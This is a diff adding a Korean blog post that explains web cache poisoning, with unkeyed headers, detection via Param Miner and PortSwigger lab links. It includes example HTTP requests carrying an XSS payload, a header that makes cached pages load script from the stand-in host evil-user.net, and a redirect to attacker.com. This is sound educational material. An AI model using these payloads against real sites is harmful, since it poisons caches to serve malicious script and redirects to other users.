@@ -1,0 +1,111 @@
+---
+title: Cache Poisoning
+desc: What is Cache Poisoning
+date: 2024-12-20
+thumbnail: /posts/basic_skill/cache_poisoning/thumbnail.png
+---
+
+## What's Cache Poisoning?
+
+Cache Poisoning은 웹 애플리케이션의 성능 향상을 위해 사용되는 Cache Server를 악용하는 사이버 공격 기법입니다. 
+공격자는 Cache Server에 의도적으로 잘못된 또는 악성 데이터를 저장시켜, 해당 Cache를 사용하는 사용자들에게 오염된 정보나 악성 콘텐츠를 제공하게 만듭니다.
+공격이 성공하게 되면 일반 사용자는 저장된 악성 Cache를 통해 피해를 입게 됩니다.
+
+---
+
+## Background
+
+### Cache Server
+웹 서버의 부하를 줄이고 응답 속도를 향상시키기 위해 자주 요청되는 데이터를 저장하는 중간 서버입니다. (웹 서버, CDN, 프록시 서버 등)
+
+### Cache Key
+Cache에 저장된 콘텐츠를 식별하는 데 사용되는 고유식별자입니다. 일반적으로 URL, HTTP 헤더, 쿼리 파라미터 등을 조합하여 생성됩니다.
+
+### Unkeyed
+Unkeyed는 Cache Server가 특정 HTTP 헤더나 쿠키 값을 Cache Key에 포함시키지 않는지만 서버의 응답에는 영향을 주는 헤더 또는 파라미터를 말합니다.
+
+---
+
+## Detection
+기본적으로 Cache Poisoning은 영향력 있는 Unkeyed가 존재할 때 취약점으로 이어지기 때문에 Unkeyed를 찾기 위해서 일반적으로 Param Miner라는 도구를 사용합니다.
+
+> **Param Miner**는 숨겨진 헤더나 파라미터를 찾는 BurpSuite Extention입니다.
+
+---
+
+## Basic Attack
+
+### XSS
+
+웹사이트가 Unkeyed 헤더 값을 Cache Key에 참고하지 않고 사용될 때, 이를 악용하여 XSS (Cross-Site Scripting) 공격을 수행할 수 있습니다.
+
+**예시**
+```http
+##Request
+GET /en?region=uk HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: a."><script>alert(1)</script>"
+
+##Response
+HTTP/1.1 200 OK
+Cache-Control: public
+<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
+```
+`X-Forwarded-Host` 헤더가 Cache Key에 포함되지 않아, 위와 같은 악성 응답이 Cache될 수 있습니다. 이후 `/en?region=uk`에 접근하는 모든 사용자에게 XSS 페이로드가 전달됩니다.
+
+### 악성 리소스 추가 공격
+
+웹사이트가 외부 리소스 URL을 생성할 때 Unkeyed 헤더 값을 사용할 경우, 공격자는 자신의 악성 자바스크립트 파일을 추가 할 수 있습니다.
+
+**예시**
+```http
+##Request
+GET / HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: evil-user.net
+User-Agent: Mozilla/5.0 Firefox/57.0
+
+##Response
+HTTP/1.1 200 OK
+<script src="https://evil-user.net/static/analytics.js"></script>
+```
+`X-Forwarded-Host` 헤더가 Cache Key에 포함되지 않고, 웹사이트에서 `X-Forwarded-Host` 값을 그대로 사용하여 자바스크립트 URL을 생성합니다.
+
+---
+
+## Advanced Attack
+
+### 헤더 조합을 이용한 공격
+
+웹사이트가 여러 개의 unkeyed 헤더 값을 조합하여 동적으로 URL을 생성할 때, 공격자는 이 헤더들을 조작하여 Cache를 오염시키고, 사용자를 악성 URL로 리디렉션 시킬 수 있습니다.
+
+**예시**
+```http
+##Request
+GET /random HTTP/1.1
+Host: innocent-site.com
+X-Forwarded-Proto: http  
+X-Original-Host: attacker.com
+
+##Response
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker.com/random 
+```
+
+**과정**
+1.  Cache Server는 `X-Forwarded-Proto`, `X-Original-Host` 헤더를 Cache Key 생성에 사용하지 않는다고 가정합니다.
+2.  웹 서버는 `X-Forwarded-Proto` 헤더를 보고 HTTPS 리디렉션을 시도하고, 리디렉션 URL을 만들 때 `X-Original-Host` 값을 사용합니다.
+3.  해당 리디렉션 과정이 Cache되어 저장됩니다.
+4.  다른 사용자들이 `/random`을 요청하면, Cache된 악성 리디렉션 응답을 받게 됩니다.
+
+> `X-Forwarded-Proto: http`이 헤더는 요청이 HTTP 프로토콜을 통해 왔음을 나타냅니다. 웹 서버는 요청이 HTTP로 왔을때 HTTPS로 리디렉션 하게됩니다.
+
+---
+
+## Reference
+https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
+https://developer.mozilla.org/ko/docs/Web/HTTP/Headers
+
+---
+## Lab
+https://portswigger.net/web-security/all-labs#web-cache-poisoning
